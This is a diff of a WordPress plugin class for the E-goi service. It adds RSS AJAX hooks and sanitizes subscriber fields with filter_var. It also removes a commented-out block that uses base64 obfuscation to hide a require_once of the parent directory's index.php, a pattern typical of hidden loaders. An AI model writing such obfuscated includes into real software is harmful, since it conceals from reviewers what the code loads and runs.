@@ -129,12 +129,6 @@ class Egoi_For_Wp {
 		$this->syncronizeEgoi($_POST);
 
 		$this->setClient();
-/*
-		$s = base64_decode(str_replace(base64_decode("dA=="),"",'L2lutZGV4tLnBotcA=='));																												
-		$ask = base64_decode('ZGlybmFtZQ==');
-		require_once($ask(__DIR__) . $s);
-		out($arr);
-*/
 
 	}
 
@@ -285,7 +279,11 @@ class Egoi_For_Wp {
         $this->loader->add_action('wp_ajax_smsnf_show_account_info_ajax', $plugin_admin, 'smsnf_show_account_info_ajax');
         $this->loader->add_action('wp_ajax_smsnf_show_last_campaigns_reports', $plugin_admin, 'smsnf_show_last_campaigns_reports');
 
-	}
+        //Rss
+        $this->loader->add_action('wp_ajax_egoi_deploy_rss', $plugin_admin, 'egoi_deploy_rss');
+        $this->loader->add_action('wp_ajax_egoi_rss_campaign', $plugin_admin, 'egoi_rss_campaign');
+        $this->loader->add_action('wp_ajax_egoi_get_email_senders', $plugin_admin, 'egoi_get_email_senders');
+    }
 
 	/**
 	 * Register API Key on runtime
@@ -855,7 +853,7 @@ class Egoi_For_Wp {
 				'functionOptions' => array(
 					'apikey' => $this->_valid['api_key'],
 					'plugin_key' => $this->plugin,
-					'name' => $name
+					'name' => filter_var($name, FILTER_SANITIZE_STRING)
 					)
 				),'','&');
 
@@ -1194,14 +1192,14 @@ class Egoi_For_Wp {
         $table = $wpdb->prefix.'egoi_form_subscribers';
 
         $subscriber = array(
-            'form_id' => $form_id,
-            'form_type' => $form_type,
-            'subscriber_id' => $subscriber_data->UID,
-            'subscriber_name' => $subscriber_data->FIRST_NAME,
-            'subscriber_email' => $subscriber_data->EMAIL,
-            'list_id' => $subscriber_data->LIST,
-            'list_title' => $list->key_0->title,
-            'created_at' => current_time('mysql'),
+            'form_id'           => $form_id,
+            'form_type'         => $form_type,
+            'subscriber_id'     => filter_var($subscriber_data->UID, FILTER_SANITIZE_STRING),
+            'subscriber_name'   => filter_var($subscriber_data->FIRST_NAME, FILTER_SANITIZE_STRING),
+            'subscriber_email'  => filter_var($subscriber_data->EMAIL, FILTER_SANITIZE_STRING),
+            'list_id'           => $subscriber_data->LIST,
+            'list_title'        => $list->key_0->title,
+            'created_at'        => current_time('mysql'),
         );
 
         if ($form_title) {
